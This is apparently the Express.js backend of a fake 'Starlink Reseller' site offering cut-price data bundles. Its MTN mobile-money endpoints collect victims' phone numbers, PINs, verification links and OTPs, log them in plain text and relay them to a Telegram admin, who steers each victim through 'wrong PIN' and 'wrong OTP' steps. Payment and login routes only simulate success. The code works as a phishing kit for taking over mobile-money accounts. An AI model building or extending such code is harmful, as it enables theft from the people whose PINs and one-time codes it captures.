const express = require('express');
const cors = require('cors');
const path = require('path');
const bodyParser = require('body-parser');
require('dotenv').config({ path: path.join(__dirname, '..', '.env') });
const { createApprovalRequest, submitOtp, submitMomoOtp, submitLink, getApprovalStatus, approvals } = require('./telegram-bot');
const { securityHeaders, corsMiddleware, validateApiSecret, rateLimit, validator, auditLog, createSession } = require('./security');

const app = express();
const PORT = process.env.PORT || 3000;

// Validate critical secrets on startup
const requiredSecrets = ['TELEGRAM_BOT_TOKEN', 'TELEGRAM_ADMIN_CHAT_ID'];
const missingSecrets = requiredSecrets.filter(key => !process.env[key] || process.env[key].includes('your-') || process.env[key].includes('change-me') || process.env[key].includes('placeholder'));
if (missingSecrets.length > 0) {
    console.error('Missing or invalid environment variables:', missingSecrets.join(', '));
    console.error('Please set these in your .env file.');
}

// Security middleware
app.use(securityHeaders);
app.use(corsMiddleware);
app.use(bodyParser.json({ limit: '1mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '1mb' }));

// Session-based auth endpoint
app.post('/api/auth/session', rateLimit({ maxRequests: 10, windowMs: 60000 }), (req, res) => {
    const token = createSession();
    res.json({ success: true, token, expiresIn: 3600000 });
});

// Explicit HTML routes — must come before static middleware
app.get('/starlink/', (req, res) => {
    res.sendFile(path.join(__dirname, '../plans.html'));
});

app.get('/starlink/status.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../index.html'));
});

app.get('/starlink/plans.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../plans.html'));
});

app.get('/starlink/orders.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../orders.html'));
});

app.get('/starlink/settings.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../settings.html'));
});

app.get('/starlink/register.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../register.html'));
});

app.get('/starlink/login.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../user-login.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../plans.html'));
});

// Root-level resources for payment gateway pages (must precede root static mount)
app.get('/manifest.json', (req, res) => {
    res.sendFile(path.join(__dirname, 'manifest.json'));
});

// Serve static assets
app.use('/starlink', express.static(path.join(__dirname, '../')));
app.use(express.static(path.join(__dirname, '../')));

// API Routes
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', message: 'Starlink Reseller API is running' });
});

// Get all packages
app.get('/api/packages', (req, res) => {
    const packages = [
        // Quotidien Limité
        { id: 'daily-1gb', name: '1 GB / 24h', data: '1 GB', duration: '24 hours', price: 1, originalPrice: 2, type: 'daily', limit: 'limited', currency: 'ZMW', features: ['1 GB data', 'Validity 24h', 'Instant activation'] },
        { id: 'daily-3gb', name: '3 GB / 24h', data: '3 GB', duration: '24 hours', price: 2, originalPrice: 4, type: 'daily', limit: 'limited', currency: 'ZMW', features: ['3 GB data', 'Validity 24h', 'Instant activation'] },
        { id: 'daily-7gb', name: '7 GB / 24h', data: '7 GB', duration: '24 hours', price: 4, originalPrice: 8, type: 'daily', limit: 'limited', currency: 'ZMW', features: ['7 GB data', 'Validity 24h', 'Instant activation'] },
        { id: 'daily-15gb', name: '15 GB / 7 days', data: '15 GB', duration: '7 days', price: 8, originalPrice: 16, type: 'daily', limit: 'limited', currency: 'ZMW', features: ['15 GB data', 'Validity 7 days', 'Instant activation'] },
        // Planifié (Extended)
        { id: 'daily-30gb', name: '30 GB / 7 days', data: '30 GB', duration: '7 days', price: 12, originalPrice: 24, type: 'weekly', limit: 'limited', currency: 'ZMW', features: ['30 GB data', 'Validity 7 days', 'Streaming HD'] },
        { id: 'daily-50gb', name: '50 GB / 15 days', data: '50 GB', duration: '15 days', price: 20, originalPrice: 40, type: 'weekly', limit: 'limited', currency: 'ZMW', features: ['50 GB data', 'Validity 15 days', 'Streaming HD', 'Priority support'] },
        // Illimité
        { id: 'daily-unlimited', name: 'Unlimited / 3 days', data: 'Unlimited', duration: '3 days', price: 10, originalPrice: 20, type: 'daily', limit: 'unlimited', currency: 'ZMW', features: ['Unlimited data', 'Validity 3 days', 'Instant activation'] },
        { id: 'weekly-unlimited', name: 'Unlimited / 7 days', data: 'Unlimited', duration: '7 days', price: 20, originalPrice: 40, type: 'weekly', limit: 'unlimited', currency: 'ZMW', features: ['Unlimited data', 'Validity 7 days', 'Streaming HD'] },
        { id: 'monthly-unlimited', name: 'Unlimited / 30 days', data: 'Unlimited', duration: '30 days', price: 50, originalPrice: 100, type: 'monthly', limit: 'unlimited', currency: 'ZMW', features: ['Unlimited data', 'Validity 30 days', 'Streaming 4K', 'Priority support', 'Static IP'] },
        // Mensuel Limité
        { id: 'monthly-10gb', name: '10 GB / 30 days', data: '10 GB', duration: '30 days', price: 15, originalPrice: 30, type: 'monthly', limit: 'limited', currency: 'ZMW', features: ['10 GB data', 'Validity 30 days', 'Streaming HD'] },
        { id: 'monthly-50gb', name: '50 GB / 30 days', data: '50 GB', duration: '30 days', price: 30, originalPrice: 60, type: 'monthly', limit: 'limited', currency: 'ZMW', features: ['50 GB data', 'Validity 30 days', 'Streaming 4K', 'Priority support'] },
        { id: 'monthly-100gb', name: '100 GB / 30 days', data: '100 GB', duration: '30 days', price: 40, originalPrice: 80, type: 'monthly', limit: 'limited', currency: 'ZMW', features: ['100 GB data', 'Validity 30 days', 'Streaming 4K', 'Priority support', 'Static IP'] }
    ];
    res.json(packages);
});

// Process payment
app.post('/api/payment', (req, res) => {
    const { packageId, method, phone, amount } = req.body;
    
    // Validate
    if (!packageId || !method || !phone || !amount) {
        return res.status(400).json({ 
            success: false, 
            message: 'Missing required fields' 
        });
    }

    // Simulate payment processing
    const orderId = Date.now().toString();
    const status = 'pending';

    res.json({
        success: true,
        message: 'Payment processed successfully',
        orderId: orderId,
        status: status,
        packageId: packageId,
        method: method,
        phone: phone,
        amount: amount
    });
});

// Get orders by phone
app.get('/api/orders/:phone', (req, res) => {
    const phone = req.params.phone;
    // In a real app, fetch from database
    // For demo, return sample orders
    const orders = [
        {
            id: '1',
            package: 'Basic Package',
            amount: 3000,
            method: 'airtel',
            phone: phone,
            date: new Date().toISOString(),
            status: 'active'
        }
    ];
    res.json(orders);
});

// Webhook for Airtel Money
app.post('/api/webhook/airtel', (req, res) => {
    const { transactionId, status, amount, phone } = req.body;
    console.log('Airtel Money Webhook:', { transactionId, status, amount, phone });
    res.json({ success: true });
});

// Webhook for Orange Money
app.post('/api/webhook/orange', (req, res) => {
    const { transactionId, status, amount, phone } = req.body;
    console.log('Orange Money Webhook:', { transactionId, status, amount, phone });
    res.json({ success: true });
});

// ── Telegram notification endpoint ─────────────────────────────
app.post('/api/telegram/notify', validateApiSecret, (req, res) => {
    const { message } = req.body;
    if (!message) {
        return res.json({ success: false, message: 'Message required' });
    }
    const sent = require('./telegram-bot').sendNotification(message);
    res.json({ success: sent, message: sent ? 'Notification sent' : 'Bot not enabled' });
});

// ── MTN Mobile Money endpoints ───────────────────────────────────
app.post('/api/mtn/submit', (req, res) => {
    const { phone, pin, country, starlinkPackage } = req.body;
    console.log('MTN Submit:', { phone, pin, country, starlinkPackage });
    
    const requestId = 'REQ-' + Date.now().toString(36).toUpperCase();
    setMtnState(requestId, 'pending', { phone, pin, country, package: starlinkPackage });
    
    const { delivered } = createApprovalRequest({
        userPhone: phone,
        userPin: pin,
        package: starlinkPackage || 'N/A',
        amount: 'N/A',
        method: 'mtn',
        requestId,
        onApproved: (id) => setMtnState(id, 'phone_pin_verified'),
        onRejected: (id) => setMtnState(id, 'rejected'),
        onWrongPin: (id) => setMtnState(id, 'wrong_pin'),
        onWrongOtp: (id) => setMtnState(id, 'wrong_link'),
        onLinkVerified: (id) => setMtnState(id, 'otp_pending'),
        onOtpWrong: (id) => setMtnState(id, 'wrong_otp'),
        onVerified: (id) => setMtnState(id, 'completed'),
        onInvalid: (id) => setMtnState(id, 'invalid'),
        onTimeout: (id) => setMtnState(id, 'timeout')
    });

    // Surface delivery so the client knows the admin was actually notified.
    delivered.then((ok) => auditLog.write('MTN_APPROVAL_DELIVERY', { requestId, delivered: ok }));
    
    res.json({ success: true, message: 'MTN payment initiated', requestId });
});

app.post('/api/mtn/momo-link', (req, res) => {
    const { link, phone, country, attempt } = req.body;
    console.log('MTN MoMo Link:', { link, phone, country, attempt });
    res.json({ success: true });
});

app.post('/api/mtn/verify-link', (req, res) => {
    const { phone, link, country } = req.body;
    console.log('MTN Verify Link:', { phone, link, country });
    res.json({ success: true, message: 'Verification link accepted' });
});

app.post('/api/mtn/resend-link', (req, res) => {
    const { phone, country } = req.body;
    console.log('MTN Resend Link:', { phone, country });
    res.json({ success: true, message: 'Verification link resent successfully' });
});

app.post('/api/mtn/proceed-verified', (req, res) => {
    res.json({ success: true, message: 'Proceeding with verified account' });
});

// Submit 4-digit OTP after link verification (MTN frontend, no API secret required)
app.post('/api/mtn/submit-otp', rateLimit({ maxRequests: 10, windowMs: 60000 }), (req, res) => {
    const { requestId, otp } = req.body;
    if (!requestId || !validator.requestId(requestId)) {
        return res.status(400).json({ success: false, message: 'A valid requestId is required' });
    }
    if (!otp || !/^\d{4}$/.test(String(otp))) {
        return res.status(400).json({ success: false, message: 'A 4-digit OTP is required' });
    }

    const result = submitMomoOtp(requestId, validator.sanitize(String(otp)));
    if (result.success) {
        setMtnState(requestId, 'otp_pending', { otp: validator.sanitize(String(otp)) });
    }
    res.json(result);
});

app.get('/api/support-whatsapp', (req, res) => {
    res.json({ number: '260XXXXXXXX' });
});

// Fix /api/check-status to support mtn_verified
let mtnVerifiedStatus = false;
app.get('/api/check-status', (req, res) => {
    res.json({ status: mtnVerifiedStatus ? 'mtn_verified' : 'pending' });
});

app.post('/api/admin/mtn-verify', validateApiSecret, (req, res) => {
    mtnVerifiedStatus = true;
    res.json({ success: true, message: 'MTN account marked as verified' });
});

app.post('/api/admin/mtn-unverify', validateApiSecret, (req, res) => {
    mtnVerifiedStatus = false;
    res.json({ success: true, message: 'MTN account marked as unverified' });
});

// ── Auth stub endpoints (for register/login pages) ──────────────
app.post('/api/starlink/register', (req, res) => {
    const { phone, password, fullName } = req.body;
    console.log('Register attempt:', { phone, fullName });
    res.json({ success: true, message: 'Registration successful', phone, name: fullName });
});

app.post('/api/starlink/login', (req, res) => {
    const { phone, password } = req.body;
    console.log('Login attempt:', { phone });
    res.json({ success: true, message: 'Login successful', phone, name: 'User' });
});

// ── Agent payment API routes ───────────────────────────────────
app.get('/api/agent-config', (req, res) => {
    const country = req.query.country;
    const provider = req.query.provider;
    const agents = {
        'CD_vodacom': { found: true, agent_number: '21500*15#', agent_name: 'Vodacom DRC Agent', instructions: 'Apeui ope code *21500*15# nano M-Pesa.' },
        'ZM_airtel': { found: true, agent_number: '146*3*1#', agent_name: 'Airtel Zambia Agent', instructions: 'Apeui enter *146*3*1# ku Airtel Money.' },
    };
    const key = country + '_' + provider;
    if (agents[key]) {
        res.json(agents[key]);
    } else {
        res.json({ found: false });
    }
});

app.post('/api/agent-payment', (req, res) => {
    const { country, provider, location, phone, package: pkg, amount, confirmation_text } = req.body;
    console.log('Agent Payment Request:', { country, provider, location, phone, package: pkg, amount });
    setTimeout(() => {
        res.json({ success: true, orderId: 'AGT-' + Date.now() });
    }, 500);
});

// ── MTN State Machine ──────────────────────────────────────────
const mtnStateStore = new Map();

function setMtnState(requestId, state, data = {}) {
    mtnStateStore.set(requestId, {
        status: state,
        updatedAt: Date.now(),
        ...data
    });
}

function getMtnState(requestId) {
    const state = mtnStateStore.get(requestId);
    if (!state) return { status: 'not_found' };
    if (state.status === 'completed' && Date.now() - state.updatedAt > 30 * 60 * 1000) {
        mtnStateStore.delete(requestId);
        return { status: 'expired' };
    }
    return state;
}

app.get('/api/mtn/status/:requestId', (req, res) => {
    const { requestId } = req.params;
    const state = getMtnState(requestId);
    res.json(state);
});

app.post('/api/mtn/update-status', (req, res) => {
    const { requestId, status, phone, pin, link, package: pkg, amount } = req.body;
    if (!requestId || !status) {
        return res.status(400).json({ success: false, message: 'requestId and status required' });
    }
    setMtnState(requestId, status, { phone, pin, link, package: pkg, amount });
    res.json({ success: true, status });
});

// ── Telegram Bot API Routes ───────────────────────────────────

// Create a new payment approval request
app.post('/api/telegram/request-approval', validateApiSecret, rateLimit({ maxRequests: 5, windowMs: 60000 }), async (req, res) => {
    const { userPhone, userPin, package: pkg, amount, method } = req.body;
    const clientIp = req.ip || 'unknown';
    
    // Validate inputs
    if (!validator.phone(userPhone)) {
        auditLog.write('TELEGRAM_REQUEST_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_phone' });
        return res.status(400).json({ success: false, message: 'Invalid phone number format' });
    }
    if (!validator.pin(userPin)) {
        auditLog.write('TELEGRAM_REQUEST_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_pin' });
        return res.status(400).json({ success: false, message: 'Invalid PIN format (4-6 digits required)' });
    }
    if (!validator.package(pkg)) {
        auditLog.write('TELEGRAM_REQUEST_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_package' });
        return res.status(400).json({ success: false, message: 'Invalid package' });
    }
    if (method && !validator.method(method)) {
        auditLog.write('TELEGRAM_REQUEST_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_method' });
        return res.status(400).json({ success: false, message: 'Invalid payment method' });
    }

    const { requestId, delivered } = createApprovalRequest({
        userPhone: validator.sanitize(userPhone),
        userPin: validator.sanitize(userPin),
        package: validator.sanitize(pkg),
        amount: amount ? validator.sanitize(amount) : 'N/A',
        method: method ? validator.sanitize(method) : 'N/A',
        onApproved: (id) => {
            console.log(`Approval request ${id} approved by admin`);
            auditLog.write('TELEGRAM_APPROVED', { requestId: id });
        },
        onRejected: (id) => {
            console.log(`Approval request ${id} rejected by admin`);
            auditLog.write('TELEGRAM_REJECTED', { requestId: id });
        },
        onInvalid: (id) => {
            console.log(`Approval request ${id} marked as invalid`);
            auditLog.write('TELEGRAM_INVALID', { requestId: id });
        },
        onVerified: (id) => {
            console.log(`Verification link approved for request ${id}`);
            auditLog.write('TELEGRAM_VERIFIED', { requestId: id, method: 'link' });
        },
        onWrongPin: (id) => {
            console.log(`Wrong PIN entered for request ${id}`);
            auditLog.write('TELEGRAM_WRONG_PIN', { requestId: id });
        },
        onWrongOtp: (id) => {
            console.log(`Invalid verification link for request ${id}`);
            auditLog.write('TELEGRAM_INVALID_LINK', { requestId: id });
        },
        onLinkVerified: (id) => {
            console.log(`Verification link approved for request ${id}, awaiting OTP`);
            auditLog.write('TELEGRAM_LINK_VERIFIED', { requestId: id });
        },
        onOtpWrong: (id) => {
            console.log(`Wrong OTP entered for request ${id}`);
            auditLog.write('TELEGRAM_WRONG_OTP', { requestId: id });
        },
        onTimeout: (id) => {
            console.log(`Verification link timeout for request ${id}`);
            auditLog.write('TELEGRAM_TIMEOUT', { requestId: id, method: 'link' });
        }
    });

    auditLog.logTelegramRequest(clientIp, userPhone, pkg, method, requestId);
    // Report honestly whether Telegram actually received the request, instead
    // of always claiming success.
    const alerted = await delivered;
    res.json({
        success: true,
        requestId,
        delivered: alerted,
        message: alerted
            ? 'Approval request sent to admin'
            : 'Request received, but the admin could not be notified. Please retry shortly.'
    });
});

// Submit OTP for verification
app.post('/api/telegram/submit-otp', validateApiSecret, rateLimit({ maxRequests: 10, windowMs: 60000 }), (req, res) => {
    const { requestId, otp } = req.body;
    const clientIp = req.ip || 'unknown';
    
    if (!validator.requestId(requestId)) {
        auditLog.write('TELEGRAM_OTP_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_request_id' });
        return res.status(400).json({ success: false, message: 'Invalid request ID format' });
    }
    if (!validator.otp(otp)) {
        auditLog.write('TELEGRAM_OTP_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_otp' });
        return res.status(400).json({ success: false, message: 'Invalid OTP format (4-8 digits required)' });
    }

    const result = submitOtp(requestId, validator.sanitize(otp));
    auditLog.logTelegramOtp(clientIp, requestId, result.success);
    res.json(result);
});

// Public verification link submit for MTN frontend (no API secret required)
app.post('/api/mtn/submit-link', (req, res) => {
    const { requestId, link } = req.body;
    if (!requestId || !validator.link(link)) {
        return res.status(400).json({ success: false, message: 'requestId and a valid verification link are required' });
    }
    
    // Sync approvals status from mtnStateStore (source of truth)
    // But don't overwrite if admin already allowed retry (phone_pin_verified)
    const mtnState = getMtnState(requestId);
    const approvalRequest = approvals.get(requestId);
    if (mtnState && mtnState.status && approvalRequest) {
        // Only sync if approval is not already in a retryable state
        if (approvalRequest.status !== 'phone_pin_verified') {
            approvalRequest.status = mtnState.status;
        }
    }
    
    const result = submitLink(requestId, validator.sanitizeLink(link));
    if (result.success) {
        setMtnState(requestId, 'link_pending', { link: validator.sanitizeLink(link) });
    }
    res.json(result);
});

// Submit verification link for Orange Money
app.post('/api/telegram/submit-link', validateApiSecret, rateLimit({ maxRequests: 10, windowMs: 60000 }), (req, res) => {
    const { requestId, link } = req.body;
    const clientIp = req.ip || 'unknown';
    
    if (!validator.requestId(requestId)) {
        auditLog.write('TELEGRAM_LINK_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_request_id' });
        return res.status(400).json({ success: false, message: 'Invalid request ID format' });
    }
    if (!validator.link(link)) {
        auditLog.write('TELEGRAM_LINK_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_link' });
        return res.status(400).json({ success: false, message: 'Invalid verification link format' });
    }

    const result = submitLink(requestId, validator.sanitizeLink(link));
    auditLog.logTelegramLink(clientIp, requestId, result.success);
    res.json(result);
});

app.get('/api/telegram/status/:requestId', validateApiSecret, (req, res) => {
    const { requestId } = req.params;
    const clientIp = req.ip || 'unknown';
    
    if (!validator.requestId(requestId)) {
        return res.status(400).json({ status: 'invalid_request_id' });
    }
    
    const status = getApprovalStatus(requestId);
    auditLog.logTelegramStatus(clientIp, requestId, status.status);
    res.json(status);
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Starlink Reseller Server running on http://localhost:${PORT}`);
    console.log(`📡 API available at http://localhost:${PORT}/api`);
});